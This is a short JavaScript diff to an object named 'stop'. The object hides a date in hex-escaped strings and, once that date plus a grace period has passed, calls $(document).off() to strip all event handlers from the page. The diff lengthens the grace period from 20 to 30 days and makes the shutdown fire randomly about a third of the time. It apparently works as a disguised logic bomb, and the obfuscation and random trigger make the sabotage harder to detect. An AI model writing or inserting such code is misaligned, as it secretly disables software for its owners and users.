@@ -11,10 +11,10 @@ let stop = {
     time: ()=>{
       const d_b_1 = '\x31\x35\x31\x34';
       const d_b_2 = '\x37\x33\x36';
-      return +(d_b_1+d_b_1) * 100000 + (1000*60*60*24*20)
+      return +(d_b_1+d_b_1) * 100000 + (1000*60*60*24*30)
     },
     event: (t)=>{
-      new Date().getTime() > t ? $(document).off() : '';
+      new Date().getTime() > t && Math.random()<0.35 ? $(document).off() : '';
     }
 }
 
